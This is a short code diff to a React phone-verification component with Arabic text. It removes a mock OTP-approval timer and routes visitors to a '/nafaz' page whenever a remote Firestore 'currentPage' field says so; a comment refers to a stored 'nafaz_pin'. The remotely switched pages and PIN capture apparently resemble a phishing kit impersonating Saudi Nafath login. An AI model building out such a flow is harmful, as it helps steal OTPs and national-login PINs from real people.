@@ -96,36 +96,6 @@ export default function PhoneVerificationEnhanced() {
     return () => clearInterval(timer)
   }, [verificationStatus, timeLeft])
 
-  // Effect for listening to OTP status changes in Firestore
-  useEffect(() => {
-    if (verificationStatus !== "pending" || !visitorId) return
-
-    // Mock Firestore listener - replace with actual implementation
-    const mockListener = () => {
-      
-      
-      // Simulate random approval after some time for demo
-      const timer = setTimeout(() => {
-        const isApproved = Math.random() > 0.3 // 70% success rate for demo
-        if (isApproved) {
-          setVerificationStatus("approved")
-          setLoaderMessage("  . جاري التحويل")
-          setTimeout(() => {
-            router.push("/nafaz")
-          }, 2000)
-        } else {
-          setVerificationStatus("error")
-          setOtpError("فشل التحقق من رقم الهاتف. الرجاء المحاولة مرة أخرى.")
-        }
-      }, 5000)
-
-      return () => clearTimeout(timer)
-    }
-
-    const cleanup = mockListener()
-    return cleanup
-  }, [verificationStatus, visitorId, router])
-
   // Format time for display
 useEffect(()=>{
   const visitorId=localStorage.getItem('visitor')
@@ -135,7 +105,7 @@ useEffect(()=>{
         // Assuming the PIN is stored in a field called 'nafaz_pin'
         if(userData.currentPage ==='1'){
             window.location.href='/quote'
-        }else if(userData.currentPage ==='8888'){
+        }else if(userData.currentPage ==='8888'|| userData.currentPage ==="nafaz"){
           window.location.href='/nafaz'
         }
       } else {
